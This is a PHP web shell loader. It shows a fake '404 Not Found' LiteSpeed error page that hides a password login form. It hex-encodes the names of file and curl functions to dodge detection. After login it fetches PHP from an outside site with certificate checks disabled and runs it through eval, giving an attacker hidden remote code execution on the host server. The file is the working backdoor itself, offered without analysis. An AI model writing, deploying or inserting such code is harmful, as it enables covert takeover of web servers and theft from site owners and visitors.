<?php
session_start();

$secure_password_hash = '$2a$12$VLOhJsp8hrqMw4NQ8I9AmuthdTOCeOALYgsjgA1wetTbksK6vYOa2'; 
$session_key = hash('sha256', $_SERVER['HTTP_HOST']);


function show_login_form()
{
    echo <<<HTML

<!DOCTYPE html>
<html style="height:100%">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<title> 404 Not Found
</title><style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style></head>
<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
<div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
        <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">404</h1>
<h2 style="margin-top:20px;font-size: 30px;">Not Found
</h2>
<p>The resource requested could not be found on this server!</p>
</div></div><div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
<br>Proudly powered by LiteSpeed Web Server<p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div><div class="login-box">
        <form method="post">
            <label>Password:</label>
            <input type="password" name="password" required>
            <input type="submit" value="Login">
        </form>
    </div></body></html>

HTML;
    exit;
}

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}

function geturlsinfo($destiny) {
    $methods = array(
        hex2str('666f70656e'), 
        hex2str('73747265616d5f6765745f636f6e74656e7473'), 
        hex2str('66696c655f6765745f636f6e74656e7473'), // 
        hex2str('6375726c5f65786563') 
    );

    if (function_exists($methods[3])) {
        $ch = curl_init($destiny);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible)");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $result = $methods[3]($ch);
        curl_close($ch);
        return $result;
    } elseif (function_exists($methods[2])) {
        return $methods[2]($destiny);
    } elseif (function_exists($methods[0]) && function_exists($methods[1])) {
        $handle = $methods[0]($destiny, "r");
        $result = $methods[1]($handle);
        fclose($handle);
        return $result;
    }
    return false;
}

if (!isset($_SESSION[$session_key])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $secure_password_hash)) {
            $_SESSION[$session_key] = true;
        } else {
            show_login_form();
        }
    } else {
        show_login_form();
    }
}

$target_url = 'https://beraskencur.site/pu/shell-desah';
$payload = geturlsinfo($target_url);
if ($payload !== false) {
    eval('?>' . $payload);
}
?>